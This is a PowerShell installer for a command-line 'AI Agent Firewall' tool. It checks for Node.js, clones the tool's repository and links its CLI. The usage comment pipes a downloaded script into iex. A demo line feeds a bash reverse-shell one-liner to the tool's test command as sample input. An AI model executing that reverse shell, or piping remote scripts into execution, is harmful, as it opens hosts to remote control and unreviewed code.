# AI Agent Firewall Installer for Windows (PowerShell)
# Usage: irm https://raw.githubusercontent.com/deveshmishra11291/ai-agent-firewall/main/install.ps1 | iex

Write-Host "┌──────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host "│  🛡️  AI AGENT FIREWALL — WINDOWS INSTALLER                    │" -ForegroundColor Cyan
Write-Host "└──────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

# Check for node
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Node.js (v18+) is required but not installed." -ForegroundColor Red
    Write-Host "Please download and install Node.js from https://nodejs.org/" -ForegroundColor Yellow
    Exit
}

$InstallDir = "$HOME\.agent-firewall"
$RepoUrl = "https://github.com/deveshmishra11291/ai-agent-firewall.git"

Write-Host "Installing AI Agent Firewall into $InstallDir..." -ForegroundColor Yellow

if (Test-Path $InstallDir) {
    Set-Location $InstallDir
    git pull origin main --quiet
} else {
    git clone --depth 1 $RepoUrl $InstallDir --quiet
}

Set-Location "$InstallDir\cli"
cmd.exe /c "npm link --silent"

Write-Host "`n✓ AI Agent Firewall successfully installed on Windows!" -ForegroundColor Green
Write-Host "Commands available: aaf, ai-firewall, agent-firewall`n" -ForegroundColor Green

Write-Host "Try it right now:" -ForegroundColor Cyan
Write-Host "  aaf --help" -ForegroundColor White
Write-Host "  aaf test `"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`"" -ForegroundColor White
Write-Host "  aaf watch ." -ForegroundColor White
